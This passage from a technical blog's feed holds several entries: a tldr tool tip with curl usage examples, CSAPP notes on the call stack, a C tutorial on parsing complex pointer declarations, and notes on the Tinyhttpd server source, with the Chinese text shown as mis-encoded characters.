class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm install -g tldr<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/0328645b122549cba76c1163e53e0dd7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å½“æˆ‘ä»¬è¾“å…¥<code>tldr curl</code>ï¼Œå¾—åˆ°å¦‚ä¸‹è¾“å‡ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> tldr curl</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> curl</span><br>  Transfers data from or to a server.<br>  Supports most protocols, including HTTP, FTP, and POP3.<br>  More information: &lt;https://curl.haxx.se&gt;.<br><br>- Download the contents of an URL to a file:<br><br>  curl http://example.com -o filename<br><br>- Download a file, saving the output under the filename indicated by the URL:<br><br>  curl -O http://example.com/filename<br><br>- Download a file, following [L]ocation redirects, and automatically [C]ontinuing (resuming) a previous file transfer:<br><br>  curl -O -L -C - http://example.com/filename<br><br>- Send form-encoded data (POST request of type `application/x-www-form-urlencoded`):<br><br>  curl -d &#x27;name=bob&#x27; http://example.com/form                                                                                            <br>- Send a request with an extra header, using a custom HTTP method:<br><br>  curl -H &#x27;X-My-Header: 123&#x27; -X PUT http://example.com                                                                                  <br>- Send data in JSON format, specifying the appropriate content-type header:<br><br>  curl -d &#x27;&#123;&quot;name&quot;:&quot;bob&quot;&#125;&#x27; -H &#x27;Content-Type: application/json&#x27; http://example.com/users/1234<br></code></pre></td></tr></table></figure><p>åŒæ—¶ï¼Œè¯¥é¡¹ç›®è¿˜æä¾›äº†ç½‘é¡µç‰ˆï¼š<a href="tldr.ostera.io">tldr.ostera.io</a> åœ¨çº¿æŸ¥è¯¢</p><p><img src="https://img-blog.csdnimg.cn/249d67a6834d412ab04c04a61ce1716d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="Linuxä¸Šä¸€äº›å…¶å®ƒå‚è€ƒ"><a href="#Linuxä¸Šä¸€äº›å…¶å®ƒå‚è€ƒ" class="headerlink" title="Linuxä¸Šä¸€äº›å…¶å®ƒå‚è€ƒ"></a>Linuxä¸Šä¸€äº›å…¶å®ƒå‚è€ƒ</h1><ul><li><code>help</code>ã€<code>info</code>å‘½ä»¤</li><li><a href="https://wizardforcel.gitbooks.io/linux-c-api-ref/content/">Linuxå‚è€ƒæ‰‹å†Œ</a><ul><li>ä¸€ä¸ªä¸­æ–‡ç‰ˆæœ¬çš„Linuxå‡½æ•°è§£é‡Š</li></ul></li><li><a href="https://cplusplus.com/">https://cplusplus.com/</a></li><li>apue</li><li>uulp</li></ul>]]></content>
    
    
    <categories>
      
      <category>å·¥å…·ä½¿ç”¨</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPPï¼šç¨‹åºçš„æœºå™¨çº§è¡¨ç¤º-4</title>
    <link href="/p/3754ea8a/"/>
    <url>/p/3754ea8a/</url>
    
    <content type="html"><![CDATA[<h1 id="å‡½æ•°è°ƒç”¨æ ˆ"><a href="#å‡½æ•°è°ƒç”¨æ ˆ" class="headerlink" title="å‡½æ•°è°ƒç”¨æ ˆ"></a>å‡½æ•°è°ƒç”¨æ ˆ</h1><h2 id="æ ˆçš„å¸ƒå±€"><a href="#æ ˆçš„å¸ƒå±€" class="headerlink" title="æ ˆçš„å¸ƒå±€"></a>æ ˆçš„å¸ƒå±€</h2><ul><li>ç”±é«˜åœ°å€å‘ä½åœ°å€å¢é•¿</li><li>æ ˆå¸§ç»“æ„çš„ä¸¤ç«¯ç”±ä¸¤ä¸ªæŒ‡é’ˆæ¥æŒ‡å®š<ul><li>æ ˆæŒ‡é’ˆï¼š%rspï¼ŒæŒ‡å‘æ ˆé¡¶ï¼Œåœ°å€æ›´é«˜</li><li>æ¡¢æŒ‡é’ˆï¼š%rbpï¼ŒæŒ‡å‘æ ˆåº•ï¼Œåœ°å€æ›´ä½</li></ul></li></ul><h2 id="å‡ºæ ˆå…¥æ ˆ"><a href="#å‡ºæ ˆå…¥æ ˆ" class="headerlink" title="å‡ºæ ˆå…¥æ ˆ"></a>å‡ºæ ˆå…¥æ ˆ</h2><ul><li>pushq Src<ul><li>ä»Srcå–æ“ä½œæ•°</li><li>å°†%rspå‡8</li><li>å°†æ“ä½œæ•°å†™åˆ°%rspæŒ‡å‘çš„åœ°å€</li></ul></li><li>popq Dst<ul><li>ä»%rspä¸­ä¿å­˜çš„åœ°å€å€¼è¯»å–æ•°å€¼</li><li>å°† %rspåŠ  8</li><li>å°†æ•°å€¼ä¿å­˜åˆ°Dst (å¿…é¡»æ˜¯å¯„å­˜å™¨)</li></ul></li></ul><h1 id="è¿‡ç¨‹æ§åˆ¶"><a href="#è¿‡ç¨‹æ§åˆ¶" class="headerlink" title="è¿‡ç¨‹æ§åˆ¶"></a>è¿‡ç¨‹æ§åˆ¶</h1><ul><li>Aå‡½æ•°è°ƒç”¨Bå‡½æ•°<ul><li>Aæ˜¯è°ƒç”¨è¿‡ç¨‹</li><li>Bæ˜¯è¢«è°ƒç”¨è¿‡ç¨‹</li></ul></li><li>è¿”å›åœ°å€å…¥æ ˆ<ul><li>è¿”å›åœ°å€ï¼ˆreturn addressï¼‰æ˜¯ç´§éšcallæŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€</li></ul></li><li>è¿‡ç¨‹è¿”å›ret<ul><li>ä»æ ˆä¸­å¼¹å‡ºè¿”å›åœ°å€</li><li>è·³è½¬åˆ°è¿”å›åœ°å€</li></ul></li><li>è¦æ³¨æ„ç†è§£%rspã€%ripçš„å˜åŒ–</li></ul><h1 id="éœ€è¦ä¿å­˜çš„å‡ ä¸ªçŠ¶æ€"><a href="#éœ€è¦ä¿å­˜çš„å‡ ä¸ªçŠ¶æ€" class="headerlink" title="éœ€è¦ä¿å­˜çš„å‡ ä¸ªçŠ¶æ€"></a>éœ€è¦ä¿å­˜çš„å‡ ä¸ªçŠ¶æ€</h1><p>æ ˆåˆ†é…å•ä½â€”â€”å¸§ï¼Œæ ˆä¸­å•ä¸ªè¿‡ç¨‹å®ä¾‹çš„çŠ¶æ€æ•°æ®</p><ul><li>å‚æ•°</li><li>å±€éƒ¨å˜é‡</li><li>è¿”å›åœ°å€</li></ul><hr><ul><li>callå¯¹åº”pushæ“ä½œï¼ˆæ ˆå¸§å¼€è¾Ÿï¼‰</li><li>retå¯¹åº”popæ“ä½œï¼ˆæ ˆå¸§å›æ”¶ï¼‰</li></ul><p>è¿™ä¸ªåœ°æ–¹è¿˜æ˜¯è¦è‡ªå·±è°ƒè¯•ä¸€éç¨‹åºï¼Œæˆ–è€…ç”»ä¸€ä¸‹è¿‡ç¨‹å›¾ï¼Œåˆ†æä¸€ä¸‹åœ°å€å’Œå‡ ä¸ªä¸»è¦å¯„å­˜å™¨</p>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ“ä½œç³»ç»Ÿï¼Œcsapp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cè¯­è¨€ï¼šå¤æ‚æŒ‡é’ˆå£°æ˜</title>
    <link href="/p/279b9795/"/>
    <url>/p/279b9795/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/cpro.png"></p><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æŒ‡é’ˆæ˜¯ä¸€ç§ä¿å­˜å˜é‡åœ°å€çš„å˜é‡ï¼Œç®€å•æŒ‡é’ˆå®¹æ˜“åˆ†æï¼Œä½†æ˜¯å½“æŒ‡é’ˆç¨å¾®å¤æ‚ï¼Œå°±å¾ˆå®¹æ˜“æ— ä»ä¸‹æ‰‹ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">char</span> *(*(**foo[][<span class="hljs-number">8</span>])())[]; <br></code></pre></td></tr></table></figure><h1 id="æ™®é€šæŒ‡é’ˆ"><a href="#æ™®é€šæŒ‡é’ˆ" class="headerlink" title="æ™®é€šæŒ‡é’ˆ"></a>æ™®é€šæŒ‡é’ˆ</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> a = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">int</span> * pa = &amp;a;<br>    <span class="hljs-keyword">int</span> ** ppa = &amp;pa;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p %d %p %p %d %p %p %d &quot;</span>, &amp;a, a, &amp;pa, pa, *pa, ppa, *ppa, **ppa);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¾“å‡ºå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0000004</span>d389ffa04 <span class="hljs-number">1</span> <br><br><span class="hljs-number">0000004</span>d389ff9f8 <span class="hljs-number">0000004</span>d389ffa04 <span class="hljs-number">1</span> <br><br><span class="hljs-number">0000004</span>d389ff9f8 <span class="hljs-number">0000004</span>d389ffa04 <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><ul><li>paæ˜¯æŒ‡å‘intç±»å‹çš„æŒ‡é’ˆï¼Œå®ƒçš„å€¼æ˜¯å˜é‡açš„åœ°å€</li><li>ppaæ˜¯æŒ‡å‘paçš„æŒ‡é’ˆï¼ˆäºŒç»´æŒ‡é’ˆï¼‰</li><li>å ä½ç¬¦ %p å¯¹åº”æŒ‡é’ˆå˜é‡çš„å€¼</li><li>&amp;pæŒ‡çš„æ˜¯æŒ‡é’ˆpåœ¨å†…å­˜ä¸­çš„åœ°å€</li></ul><h1 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h1><h2 id="è¿ç®—ç¬¦ç»“åˆé¡ºåº"><a href="#è¿ç®—ç¬¦ç»“åˆé¡ºåº" class="headerlink" title="è¿ç®—ç¬¦ç»“åˆé¡ºåº"></a>è¿ç®—ç¬¦ç»“åˆé¡ºåº</h2><ul><li><p>ç»“åˆçš„ä¼˜å…ˆçº§ç”±å¤§åˆ°å°ï¼š<code>()</code> &gt; <code>[]</code> &gt; <code>*</code></p></li><li><p>è‘—åçš„å³å·¦æ³•åˆ™ï¼šå…ˆçœ‹æœ€é‡Œé¢çš„æ‹¬å·ï¼Œå†çœ‹å³è¾¹ï¼Œå†çœ‹å·¦è¾¹ã€‚æ¯å½“ä½ é‡åˆ°æ‹¬å·ï¼Œä½ åº”è¯¥æ”¹å˜ä½ çš„é˜…è¯»æ–¹å‘ã€‚è§£æå®Œæ‹¬å·å†…çš„æ‰€æœ‰å†…å®¹åï¼Œè·³å‡ºæ‹¬å·ã€‚é‡å¤æ­¤è¿‡ç¨‹ï¼Œç›´åˆ°è§£å†³æ•´ä¸ªè¯­å¥ã€‚</p></li></ul><blockquote><p>Right-Left Rule: First look at the innermost parenthesis, then look to the right, and then to the left. Whenever you encounter parentheses, you should switch your reading direction. Once you have parsed everything inside the parentheses, jump out of the parentheses. Repeat this process until the entire statement is resolved. </p></blockquote><p>å‚è€ƒï¼š<a href="https://blog.karatos.in/a?ID=00250-f7e0610c-459c-431a-a3ab-d9a50a7d5598">c pointer right and left rule</a></p><h2 id="å‡½æ•°æŒ‡é’ˆ"><a href="#å‡½æ•°æŒ‡é’ˆ" class="headerlink" title="å‡½æ•°æŒ‡é’ˆ"></a>å‡½æ•°æŒ‡é’ˆ</h2><p>å‡½æ•°æŒ‡é’ˆæ˜¯æŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆå˜é‡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">max</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> x &gt; y ? x : y;<br>&#125;<br><br>---<br><br><span class="hljs-keyword">int</span> (* p)(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>) = &amp; max; <span class="hljs-comment">// &amp;å¯ä»¥çœç•¥</span><br></code></pre></td></tr></table></figure><ul><li>pæ˜¯å‡½æ•°æŒ‡é’ˆ</li><li>å‚æ•°ä¸ºï¼ˆintï¼Œintï¼‰ï¼Œè¿”å›å€¼ä¸ºint</li><li>æ­¤åpç›¸å½“äºmaxï¼Œp(a,b)ç›¸å½“äºmax(a,b)</li></ul><p>#å¤æ‚æŒ‡é’ˆåˆ†æ</p><h2 id="int-f"><a href="#int-f" class="headerlink" title="int* f();"></a>int* f();</h2><ul><li>ç”±ä¸Šè¿°ç»“åˆé¡ºåºå¾—ï¼Œfå…ˆå’Œ()ç»“åˆ</li><li>f æ˜¯ä¸€ä¸ªå‡½æ•° ï¼Œå®ƒçš„è¿”å›å€¼æ˜¯int* ç±»å‹ï¼Œä¹Ÿå³æ˜¯æŒ‡å‘int ç±»å‹çš„æŒ‡é’ˆ</li></ul><h2 id="int-f-1"><a href="#int-f-1" class="headerlink" title="int (* f)();"></a>int (* f)();</h2><ul><li>ç”±äº()çš„å­˜åœ¨ï¼Œfå…ˆå’Œ*ç»“åˆï¼Œå†å’Œå³ä¾§çš„()ç»“åˆ</li><li>fæ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œå®ƒæŒ‡å‘çš„å‡½æ•°çš„è¿”å›å€¼æ˜¯intç±»å‹</li><li>ç¨‹åºä¸­çš„æ¯ä¸ªå‡½æ•°éƒ½ä½äºå†…å­˜ä¸­çš„æŸä¸ªä½ç½®ï¼Œæ‰€ä»¥å­˜åœ¨æŒ‡å‘é‚£ä¸ªä½ç½®çš„æŒ‡é’ˆ</li></ul><h2 id="int-f-2"><a href="#int-f-2" class="headerlink" title="int* (* f)();"></a>int* (* f)();</h2><ul><li>fæ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆ</li><li>å®ƒæŒ‡å‘çš„å‡½æ•°çš„è¿”å›å€¼æ˜¯æŒ‡å‘intç±»å‹çš„æŒ‡é’ˆ</li></ul><h1 id="int-f-3"><a href="#int-f-3" class="headerlink" title="int *f[]"></a>int *f[]</h1><ul><li>fæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œè¯¥æ•°ç»„æ¯ä¸ªå…ƒç´ éƒ½æ˜¯æŒ‡å‘intç±»å‹çš„æŒ‡é’ˆ</li></ul><h1 id="int-f-10"><a href="#int-f-10" class="headerlink" title="int (*f)[10]"></a>int (*f)[10]</h1><ul><li>fæ˜¯ä¸€ä¸ªæŒ‡é’ˆ</li><li>æŒ‡å‘ä¸€ä¸ªintç±»å‹çš„æ•°ç»„ï¼Œè¯¥æ•°ç»„æœ‰åä¸ªintç±»å‹çš„å€¼ </li></ul><h1 id="int-f-4"><a href="#int-f-4" class="headerlink" title="int ** f"></a>int ** f</h1><p>å¯ä»¥å‚è€ƒ<a href="https://blog.csdn.net/weixin_43864567/article/details/122778185?spm=1001.2014.3001.5501">ã€Cè¯­è¨€æŒ‡é’ˆã€‘char* argv[] ã€char **argvã€å‘½ä»¤è¡Œä¼ å‚</a></p><h1 id="int-f-5"><a href="#int-f-5" class="headerlink" title="int (*f[])();"></a>int (*f[])();</h1><ul><li> fæ˜¯ä¸€ä¸ªæ•°ç»„</li><li>æ•°ç»„å…ƒç´ çš„ç±»å‹æ˜¯å‡½æ•°æŒ‡é’ˆ</li><li>å‡½æ•°çš„è¿”å›å€¼æ˜¯ä¸€ä¸ªæ•´å‹å€¼</li></ul><h1 id="int-f-6"><a href="#int-f-6" class="headerlink" title="int *(*f[])();"></a>int *(*f[])();</h1><ul><li> fæ˜¯ä¸€ä¸ªæ•°ç»„</li><li>æ•°ç»„å…ƒç´ çš„ç±»å‹æ˜¯å‡½æ•°æŒ‡é’ˆ</li><li>å‡½æ•°çš„è¿”å›å€¼æ˜¯æŒ‡å‘ int ç±»å‹çš„æŒ‡é’ˆ</li></ul><h1 id="int-pfunc-int-5-int"><a href="#int-pfunc-int-5-int" class="headerlink" title="int (*(*(*pfunc)(int *))[5])(int *)"></a>int (*(*(*pfunc)(int *))[5])(int *)</h1><ul><li>pfuncæ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆ</li><li>å‡½æ•°çš„å‚æ•°æ˜¯æŒ‡å‘intç±»å‹çš„æŒ‡é’ˆ</li><li>å‡½æ•°çš„è¿”å›å€¼æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘ä¸€ä¸ªå…·æœ‰äº”ä¸ªå…ƒç´ çš„æ•°ç»„ï¼Œè¯¥æ•°ç»„çš„æ¯ä¸€ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªæŒ‡é’ˆ</li><li>æ­¤æŒ‡é’ˆæŒ‡å‘ä¸€ä¸ªå‡½æ•°ï¼Œè¯¥å‡½æ•°çš„å‚æ•°ä¸ºint * ï¼Œè¿”å›ç±»å‹ä¸ºint</li></ul><h1 id="void-signal-int-sig-void-func-int-int"><a href="#void-signal-int-sig-void-func-int-int" class="headerlink" title="void (*signal(int sig, void (*func)(int)))(int);"></a><code>void (*signal(int sig, void (*func)(int)))(int);</code></h1><ul><li>ç®€åŒ–å£°æ˜<ul><li><code>void (*signal(int sig, func))(int);</code></li><li><code>void (*)(int);</code></li></ul></li><li>signal æ˜¯ä¸€ä¸ªå‡½æ•°<ul><li>æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªä¸ºintç±»å‹ï¼Œä¸€ä¸ªä¸ºæŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆ</li><li>è¿”å›å€¼ä¸ºæŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆï¼ˆå‚æ•°ä¸ºintï¼Œè¿”å›å€¼ä¸ºvoidï¼‰<h1 id="cdecl-è¾…åŠ©åˆ†æ"><a href="#cdecl-è¾…åŠ©åˆ†æ" class="headerlink" title="cdecl è¾…åŠ©åˆ†æ"></a>cdecl è¾…åŠ©åˆ†æ</h1>é€šè¿‡åŒ…ç®¡ç†å™¨å®‰è£…cdeclç¨‹åº<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">$ sudo apt install cdecl<br><br>$ cdecl<br><br>cdecl&gt; explain <span class="hljs-keyword">char</span> *(*(**foo[][<span class="hljs-number">8</span>])())[]<br><br>declare foo as <span class="hljs-built_in">array</span> of <span class="hljs-built_in">array</span> <span class="hljs-number">8</span> of pointer to pointer to function returning pointer to <span class="hljs-built_in">array</span> of pointer to <span class="hljs-keyword">char</span><br></code></pre></td></tr></table></figure></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>Cè¯­è¨€</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Cè¯­è¨€ï¼ŒæŒ‡é’ˆ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Tinyhttpdæºç å­¦ä¹ </title>
    <link href="/p/29256323/"/>
    <url>/p/29256323/</url>
    
    <content type="html"><![CDATA[<h1 id="å‡½æ•°è°ƒç”¨åˆ†æ"><a href="#å‡½æ•°è°ƒç”¨åˆ†æ" class="headerlink" title="å‡½æ•°è°ƒç”¨åˆ†æ"></a>å‡½æ•°è°ƒç”¨åˆ†æ</h1><ul><li>mainå‡½æ•°è°ƒç”¨äº†startå‡½æ•°è¿›è¡ŒæœåŠ¡å™¨ç«¯çš„ç›‘å¬å¥—æ¥å­—ç»‘å®š<ul><li>startå‡½æ•°åŒ…å«äº†å¥—æ¥å­—çš„åˆ›å»ºã€è®¾ç½®ã€ç»‘å®šç­‰ï¼Œç‰µæ‰¯åˆ°ç½‘ç»œç¼–ç¨‹çš„ä¸€äº›çŸ¥è¯†ç‚¹ï¼Œæ¯”å¦‚sockaddr_inç»“æ„ä½“ã€bindå‡½æ•°ç­‰</li></ul></li><li>ä¸»å‡½æ•°è¿›å…¥æ­»å¾ªç¯ï¼Œä½¿ç”¨acceptå‡½æ•°é˜»å¡ç­‰å¾…å®¢æˆ·ç«¯çš„ç½‘ç»œè¿æ¥è¯·æ±‚</li><li>ä½¿ç”¨pthread_creatå‡½æ•°åˆ›å»ºçº¿ç¨‹</li><li>accept_requestå‡½æ•°åˆ¤æ–­httpè¯·æ±‚æ˜¯postè¿˜æ˜¯getï¼Œä»è€Œå†³å®šæ˜¯ç›´æ¥å‘clientä¼ é€æ–‡ä»¶è¿˜æ˜¯æ‰§è¡Œcgiè„šæœ¬</li><li>execute_cgiå‡½æ•°æ˜¯è¯¥é¡¹ç›®çš„ç²¾é«“ï¼ŒåŒ…å«äº†åŒ¿åç®¡é“ã€è¿›ç¨‹é—´é€šä¿¡ã€forkè¿›ç¨‹ã€ç¯å¢ƒå˜é‡ç­‰çŸ¥è¯†</li><li><strong>å¯¹ä»£ç çš„æ³¨é‡Šçš„repositoryï¼š</strong> <a href="https://github.com/LaPhilosophie/Tinyhttpd">https://github.com/LaPhilosophie/Tinyhttpd</a></li></ul><h1 id="ä¸€äº›åˆ†æå›¾"><a href="#ä¸€äº›åˆ†æå›¾" class="headerlink" title="ä¸€äº›åˆ†æå›¾"></a>ä¸€äº›åˆ†æå›¾</h1><p><img src="/image/Snipaste_2022-08-23_23-22-55.png" alt="å‡½æ•°è°ƒç”¨é“¾åˆ†æ"></p><p><img src="/image/tinyhttpd-work-flow1.png" alt="ç®¡é“çš„åˆ†æå›¾"></p><h1 id="ç½‘ç»œç¼–ç¨‹ä¸å¥—æ¥å­—"><a href="#ç½‘ç»œç¼–ç¨‹ä¸å¥—æ¥å­—" class="headerlink" title="ç½‘ç»œç¼–ç¨‹ä¸å¥—æ¥å­—"></a>ç½‘ç»œç¼–ç¨‹ä¸å¥—æ¥å­—</h1><ul><li>å¥—æ¥å­—Aç”¨äºç›‘å¬å’Œæ¥å—å®¢æˆ·ç«¯è¯·æ±‚ï¼Œç»‘å®šç›‘å¬çš„ipåœ°å€å’Œç«¯å£ï¼Œé˜»å¡ç­‰å¾…å®¢æˆ·ç«¯è¿æ¥è¯·æ±‚</li><li>å¦‚æœå¥—æ¥å­—Aæ¥æ”¶åˆ°äº†å®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚ï¼Œé‚£ä¹ˆæœåŠ¡å™¨ä¼šåˆ›å»ºå‡ºæ–°çš„å¥—æ¥å­—Bï¼Œç”¨äºå’Œå®¢æˆ·ç«¯çš„é€šä¿¡ï¼Œè€Œä¹‹å‰çš„ç›‘å¬å¥—æ¥å­—Aç»§ç»­ç›‘å¬ï¼Œå¦‚æœæœ‰åˆ«çš„æ¥è‡ªå®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚ï¼Œé‚£ä¹ˆä¼šç»§ç»­åˆ›å»ºå‡ºå’Œå®¢æˆ·ç«¯é€šä¿¡çš„å¥—æ¥å­—Cã€Dã€Eâ€¦</li><li>æœåŠ¡å™¨ä¸å®¢æˆ·ç«¯çš„é€šä¿¡æ¨¡å‹å›¾ï¼š</li></ul><p><img src="https://docs.oracle.com/cd/E38902_01/html/E38880/figures/7099.png"></p><h1 id="è¿›ç¨‹ç›¸å…³çŸ¥è¯†"><a href="#è¿›ç¨‹ç›¸å…³çŸ¥è¯†" class="headerlink" title="è¿›ç¨‹ç›¸å…³çŸ¥è¯†"></a>è¿›ç¨‹ç›¸å…³çŸ¥è¯†</h1><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs delphi">int pthread_create(pthread_t *thread,<br>                   <span class="hljs-keyword">const</span> pthread_attr_t *attr,<br>                   void *<span class="hljs-comment">(*start_routine) (void *)</span>,<br>                   void *arg);<br><br></code></pre></td></tr></table></figure><p>ä¸Šè¿°å‡½æ•°çš„å››ä¸ªå‚æ•°åˆ†åˆ«ä¸ºï¼š</p><ul><li>çº¿ç¨‹çš„åœ°å€</li><li>æ‰‹åŠ¨è®¾ç½®æ–°å»ºçº¿ç¨‹çš„å±æ€§ï¼Œè‹¥ä¸ºNULLï¼Œé‚£ä¹ˆä¼šé‡‡ç”¨ç³»ç»Ÿçš„é»˜è®¤å±æ€§å€¼è®¾ç½®çº¿ç¨‹å±æ€§</li><li>ä»¥å‡½æ•°æŒ‡é’ˆçš„æ–¹å¼æŒ‡æ˜æ–°å»ºçº¿ç¨‹éœ€è¦æ‰§è¡Œçš„å‡½æ•°ï¼Œå½¢å‚å’Œè¿”å›å€¼çš„ç±»å‹éƒ½å¿…é¡»ä¸º void* ç±»å‹</li><li>argæ˜¯å‡½æ•°çš„å‚æ•°</li></ul><p>çº¿ç¨‹åˆ›å»ºæˆåŠŸæ—¶è¿”å›0ï¼Œå¤±è´¥ä¸ºé0</p><h1 id="httpåè®®è¯·æ±‚å¤´æ ¼å¼"><a href="#httpåè®®è¯·æ±‚å¤´æ ¼å¼" class="headerlink" title="httpåè®®è¯·æ±‚å¤´æ ¼å¼"></a>httpåè®®è¯·æ±‚å¤´æ ¼å¼</h1><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="hljs-template-variable">&#123;method&#125;</span><span class="xml"> </span><span class="hljs-template-variable">&#123;path&#125;</span><span class="xml"> </span><span class="hljs-template-variable">&#123;http_version&#125;</span><span class="xml">(CRLF)</span><br><span class="xml"></span><span class="hljs-template-variable">&#123;header_name&#125;</span><span class="xml">: </span><span class="hljs-template-variable">&#123;header_value&#125;</span><span class="xml">(CRLF)</span><br><span class="xml">...more header info(CRLF)</span><br><span class="xml">(CRLF)</span><br><span class="xml"></span><span class="hljs-template-variable">&#123;content&#125;</span><br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€è¡Œï¼ˆæ¶ˆæ¯è¡Œï¼‰åŒ…å« HTTP æ–¹æ³•å’Œç›®æ ‡ï¼Œä¾‹ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">GET <span class="hljs-regexp">/mysite/my</span>directory<span class="hljs-regexp">/index.html HTTP/</span><span class="hljs-number">1.1</span>\r\n<br></code></pre></td></tr></table></figure><p>æ ¼å¼ä¸­çš„å˜é‡è¯´æ˜</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-function"><span class="hljs-keyword">method</span>:</span> GET,POST,PUT,DELETE ç­‰ç­‰<br>path: URLè·¯å¾„éƒ¨åˆ†ï¼Œå¦‚ï¼š/<span class="hljs-keyword">index</span>.html<br>versionï¼šå¦‚ï¼šhttp/<span class="hljs-number">1.1</span><br>header_name: 